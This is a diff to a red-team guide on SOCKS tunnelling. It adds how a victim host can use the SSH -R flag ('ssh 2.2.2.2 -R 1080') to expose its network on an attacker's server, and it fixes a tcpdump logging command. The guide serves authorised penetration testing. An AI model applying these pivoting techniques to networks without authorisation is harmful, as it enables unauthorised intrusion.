@@ -123,7 +123,11 @@ Most C2 software has SOCKS functionality built-in. Once the SOCKS server is star
 Besides using the built-in SOCKS functionality of C2 software there are also various other setups which allow access to the target network over SOCKS. These setups will be discussed in the following subsections.
 
 ## SSH
-The SSH client which is nowadays present on both Windows and Linux has SOCKS functionality built-in. When connecting over SSH to a remote host using the SSH client, it is possible to provide the `-D` parameter with a port number to the SSH client, which then opens a SOCKS4a listener on the client host. For example, `ssh 2.2.2.2 -D 1080` will connect to the SSH server running on port `22/TCP` of `2.2.2.2`, and then on the client (`1.1.1.1`) launch a SOCKS4a listener on the loopback interface on port `1080/TCP`.
+The SSH client which is nowadays present on both Windows and Linux has SOCKS functionality built-in. Moreover, SSH can expose SOCKS on either the SSH client side or on the SSH server side.
+
+When connecting over SSH to a remote (victim) host using the SSH client, the `-D` parameter can be provided with a port number to the SSH client, which then opens a SOCKS4a listener on the client host. For example, `ssh 2.2.2.2 -D 1080` will connect to the SSH server running on port `22/TCP` of `2.2.2.2`, and then on the client (`1.1.1.1`) launch a SOCKS4a listener on the loopback interface on port `1080/TCP`.
+
+Alternatively, using the `-R` parameter an SSH connection can be established from the victim host (`1.1.1.1`) to the attacker's SSH server (`2.2.2.2`), exposing the network to which the victim is connected on a SOCKS port on the attacker's SSH server. The commandline for this setup is `ssh 2.2.2.2 -R 1080`. Once connected, the attacker's SSH server will have a SOCKS4a listener on port `1080/TCP`.
 
 ## Hardware implant
 A bit more complex setup could also be used during a red team with a hardware implant like a Raspberry Pi, which is for example connected to the network outlet in a meeting room. This hardware implant then automatically connects back over a 4G/5G dongle to an online hosted Linux middle server where in the connection the `-R 2222:127.0.0.1:22` parameter to expose the SSH port of the hardware implant on the middle server. This then allows the attacker to connect to the middle server, and through port `2222` on this middle server get access to the hardware implant where again the `-D` parameter of the SSH client is used to launch the SOCKS server on the attacker side. This then provides the attacker access to the network where the hardware implant is connected. The blue lines in the schematic indicate that these connections are going over the 4G/5G dongle of the hardware implant.
@@ -465,7 +469,7 @@ Because split tunneling is used, the iptables rules need to be configured for bo
 During pentesting and red teaming activities a best practice is to maintain logging of interactions with the client environment, such as the network traffic. The LOFL setup allows for a very easy logging of such network traffic by simply running a tcpdump on the `tun1` interface. Such command looks as follows.
 
 ```bash
-tcpdump -s0 -n -i tun1 -w \$(date +%Y%m%d%H%M%S).pcap
+tcpdump -s0 -n -i tun1 -w $(date +%Y%m%d%H%M%S).pcap
 ```
 
 # Conclusion
@@ -525,7 +529,7 @@ When launching Windows Terminal (`wt.exe`) from an elevated prompt in which the 
 | C2        | Metasploit        | Yes                 | No      | Yes, transparent         | <https://www.metasploit.com/>                 | Documentation: <https://www.rapid7.com/db/modules/auxiliary/server/socks4a/>                                                       |
 | C2        | Sliver            | Yes                 | ?       | Yes, transparent         | <https://github.com/BishopFox/sliver>         | Documentation: <https://github.com/BishopFox/sliver/wiki/Reverse-SOCKS>                                                            |
 | C2        | \*                | n/a                 | n/a     | n/a                      | <https://www.thec2matrix.com/>                | Website dedicated to comparing many different C2 frameworks, including whether they have SOCKS support                             |
-| Hardware  | Hardware implant  | No                  | No      | n/a                      | n/a                                           | Connecting to hardware implant or a Linux server and specifying the dynamic port forwarding flag (`-D`): `ssh -D 1080`                 |
+| Hardware  | Hardware implant  | No                  | No      | n/a                      | n/a                                           | Connecting to hardware implant or a Linux server and specifying the dynamic port forwarding flag (`-D`): `ssh -D 1080` or reverse dynamic port forwarding flag (`-R`): `ssh -R 1080`                 |
 | RDP       | Ica2Tcp           | n/a                 | No      | n/a                      | <https://github.com/synacktiv/ica2tcp>        | For Citrix                                                                                                                         |
 | RDP       | rdp2tcp           | n/a                 | No      | n/a                      | <https://github.com/V-E-O/rdp2tcp>            | For rdesktop in Linux                                                                                                              |
 | RDP       | SocksOverRDP      | n/a                 | No      | n/a                      | <https://github.com/nccgroup/SocksOverRDP>    | SOCKS tunnel over dynamic virtual channels of Microsoft Remote Desktop or Citrix Remote Desktop                                    |
